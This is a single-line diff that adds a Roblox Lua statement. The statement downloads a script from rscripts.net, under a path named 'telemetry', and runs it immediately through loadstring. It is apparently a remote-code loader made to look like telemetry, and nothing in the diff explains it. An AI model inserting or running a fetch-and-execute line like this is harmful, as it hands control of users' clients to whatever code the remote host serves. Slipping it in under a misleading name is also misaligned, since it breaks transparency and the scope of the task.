@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6abba1e95e4320df8594c4bc"))()
